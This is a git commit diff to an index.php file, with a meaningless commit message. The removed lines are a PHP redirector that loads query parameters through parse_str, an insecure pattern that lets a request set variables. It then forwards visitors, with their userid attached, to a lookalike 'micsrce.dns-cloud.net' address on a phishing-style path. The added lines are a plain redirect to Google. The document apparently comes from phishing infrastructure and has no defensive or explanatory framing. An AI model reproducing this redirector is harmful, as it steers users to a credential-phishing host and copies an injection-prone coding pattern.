1fba0d33b34b1e9dbf2d0852bc2c2a0ee4305743
carcrasi <58958541+carcrasi@users.noreply.github.com>
2020-06-26 10:38:47 +0100

    mrmewcni

--- index.php
+++ index.php
@@ -1,5 +1,6 @@
-<?php 
-	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
-	parse_str(parse_url($url, PHP_URL_QUERY));
-	header('Location: https://micsrce.dns-cloud.net/esccna/=/index.php?l=_AHP5sggsJLP20ZWzbLrtkzcNH0YGCcvRN1gPeG6TEC7cY3jm6H_Product-UserID&userid='.$userid);
-?>
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Refresh" content="0;url=https://www.google.com">
+</head>
+</html>
